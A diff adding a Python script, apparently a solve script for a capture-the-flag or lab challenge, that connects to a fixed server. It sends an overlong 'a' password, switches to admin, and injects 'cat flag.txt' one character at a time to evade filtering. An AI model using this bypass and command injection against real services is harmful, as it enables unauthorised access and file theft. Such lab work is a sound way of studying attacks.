@@ -1,0 +1,72 @@
+#!/usr/bin/env python3
+import socket
+
+# 伺服器相關設定
+HOST = "140.113.207.245"
+PORT = 30172
+
+def main():
+    # 建立 TCP socket
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    try:
+        # 連線到伺服器
+        sock.connect((HOST, PORT))
+        
+        # 讀取伺服器回應 (例如歡迎訊息)
+        data = sock.recv(1024).decode()
+        print(data)
+
+        sock.sendall(("2\n").encode())
+        data = sock.recv(1024).decode()
+        print(data)
+        
+        # 傳送密碼，加上換行符號以符合伺服器要求
+        sock.sendall(("aaaaaaaaaaaaaaaaa\n").encode())
+        data = sock.recv(1024).decode()
+        print(data)
+        
+        sock.sendall(("b\n").encode())
+        data = sock.recv(1024).decode()
+        print(data)
+
+        sock.sendall(("1\n").encode())
+        data = sock.recv(1024).decode()
+        print(data)
+
+        sock.sendall(("admin\n").encode())
+        data = sock.recv(1024).decode()
+        print(data)
+
+        sock.sendall(("a\n").encode())
+        data = sock.recv(1024).decode()
+        print(data)
+
+        sock.sendall(("3\n").encode())
+        data = sock.recv(1024).decode()
+        print(data)
+
+        sock.sendall(("c").encode())
+        sock.sendall(("a").encode())
+        sock.sendall(("t").encode())
+        sock.sendall((" ").encode())
+        sock.sendall(("f").encode())
+        sock.sendall(("l").encode())
+        sock.sendall(("a").encode())
+        sock.sendall(("g").encode())
+        sock.sendall((".").encode())
+        sock.sendall(("t").encode())
+        sock.sendall(("x").encode())
+        sock.sendall(("t").encode())
+        sock.sendall(("\n").encode())
+        data = sock.recv(1024).decode()
+        print(data)
+        
+    except Exception as e:
+        print("發生錯誤:", e)
+    finally:
+        # 關閉連線
+        sock.close()
+
+if __name__ == "__main__":
+    main()
